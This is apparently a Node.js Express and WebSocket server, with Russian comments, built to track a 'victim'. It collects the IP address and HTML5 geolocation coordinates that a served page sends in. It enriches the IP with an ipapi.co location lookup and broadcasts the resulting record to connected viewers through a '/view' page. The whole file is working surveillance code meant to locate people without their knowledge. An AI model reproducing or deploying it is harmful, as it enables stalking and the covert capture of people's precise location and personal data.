const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const axios = require('axios');
const path = require('path');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

let victimData = null;

wss.on('connection', ws => {
    console.log('Новый клиент подключен');

    ws.on('message', async message => {
        try {
            const data = JSON.parse(message);
            victimData = data;

            // Получение геолокации по IP
            const ip = data.ip;
            const response = await axios.get(`https://ipapi.co/${ip}/json/`);
            victimData.location = response.data;

            // Получение точного местоположения через HTML5 Geolocation API
            if (data.latitude && data.longitude) {
                victimData.preciseLocation = {
                    latitude: data.latitude,
                    longitude: data.longitude
                };
            }

            // Отправка данных всем подключенным клиентам
            wss.clients.forEach(client => {
                if (client.readyState === WebSocket.OPEN) {
                    client.send(JSON.stringify(victimData));
                }
            });
        } catch (err) {
            console.error('Ошибка обработки сообщения: ', err);
        }
    });

    ws.on('close', () => {
        console.log('Клиент отключен');
    });
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/view', (req, res) => {
    res.sendFile(path.join(__dirname, 'view.html'));
});

server.listen(3000, () => {
    console.log('Сервер запущен на порту 3000');
});